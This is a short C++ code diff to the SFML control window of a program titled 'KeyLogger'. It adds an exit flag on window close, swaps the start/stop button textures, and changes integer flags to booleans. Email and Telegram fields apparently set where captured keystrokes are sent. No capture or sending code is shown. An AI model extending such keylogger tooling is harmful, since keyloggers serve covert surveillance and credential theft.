@@ -25,6 +25,7 @@ void GUI::run()
     bool checkedStatusTG = false;  
     bool checkStart = false;
     bool activeStart = false;
+    // to do rwers to false when empty data
     std::string emailDefault;
     std::string tgDefault;
     sf::RenderWindow window(sf::VideoMode(WIDTH_WINDOW, HEIGHT_WINDOW), "KeyLogger", sf::Style::Close);
@@ -134,8 +135,10 @@ void GUI::run()
         sf::Event event;
         while (window.pollEvent(event))
         {
-            if (event.type == sf::Event::Closed)
+            if (event.type == sf::Event::Closed) {
+                Runner::exitProgram = true;
                 window.close();
+            }
             else if (sf::Mouse::isButtonPressed(sf::Mouse::Left)) {
                 sf::Vector2i mousePosition = sf::Mouse::getPosition(window);
                 sf::Vector2f mousePositionF(static_cast<float> (mousePosition.x), static_cast<float> (mousePosition.y));
@@ -198,13 +201,13 @@ void GUI::run()
                     }
                 }
                 else if (keyloggerBtn.getGlobalBounds().contains(mousePositionF) && activeStart) {
-                    keyloggerBtn.setTexture(checkStart ? stopKey : startKey);
+                    keyloggerBtn.setTexture(checkStart ? startKey : stopKey);
                     checkStart = !checkStart;
                     if (checkStart) {
-                        Runner::exit = 0;
+                        Runner::exit = false;
                     }
                     else {
-                        Runner::exit = 1;
+                        Runner::exit = true;
                     }
                 }
             }
